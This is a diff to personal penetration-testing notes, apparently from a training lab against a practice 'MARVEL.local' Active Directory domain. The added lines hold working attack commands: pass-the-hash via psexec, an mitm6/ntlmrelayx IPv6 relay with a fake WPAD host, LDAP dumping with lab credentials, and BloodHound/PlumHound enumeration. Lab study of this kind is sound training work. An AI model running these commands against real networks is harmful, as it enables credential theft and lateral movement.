@@ -413,7 +413,7 @@ run
 
 I HAD TO DISABLE VIRUS PROTECTION ON WINDOWS VM
 
-exploit local user administrator
+exploit local user administrator 
 unset smbdomain
 set smbuser administrator
 set smbpass HASH
@@ -426,4 +426,53 @@ MANUAL
 psexec.py MARVEL/fcastle:'Password1'@{ip}
 psexec.py administrator@{ip} -hashes {HASH}
 wmiexec/smbexec (alternatives)
+
+
+###IPv6
+
+ntlmrelayx -6 -t ldaps://{ip} -wh fakewpad.marvel.local -l lootme
+sudo mitm6 -d marvel.local
+
+make sure impacket and ldapdomaindump version aligns
+
+<img width="728" height="496" alt="image" src="https://github.com/user-attachments/assets/99c6b7a9-331c-4300-ab38-b16b3686193b" />
+
+In windows vm. login to domaincontroller admin
+MARVEL/adminsitrator
+<img width="803" height="298" alt="image" src="https://github.com/user-attachments/assets/9e5ce728-6f84-49ef-bcb2-5714b3c638fe" />
+
+Prevention
+<img width="893" height="661" alt="image" src="https://github.com/user-attachments/assets/57d6bdba-1a52-41c7-91c1-d03e7f4d13b8" />
+
+### ldapdomaindump
+
+if you already have credentials
+sudo ldapdomaindump ldaps://192.168.1.65 -u 'MARVEL\fcastle' -p Password1  
+
+
+### Bloodhound
+sudo apt install neo4j
+install legacy bloodhound
+sudo neo4j console
+first login with neo4j neo4j and change the password
+change the etcfile with updated password
+./BloodHound --no-sandbox
+
+create a new dir
+bloodhound-python -d MARVEL.local -u fcastle -p Password1 -ns 192.168.1.65 -c all
+
+go back to bloodhound and on the rightside upload all the files from the previous command
+
+
+### PLumhound
+
+requires neo4j and bloodhound to be open
+cd /opt/PlumHound
+sudo chown -R kali:kali .   
+python3 PlumHound.py --easy -p neo4j1
+
+python3 PlumHound.py -x tasks/default.tasks -p neo4j1
+creates a report file
+firefox index.html
+
 
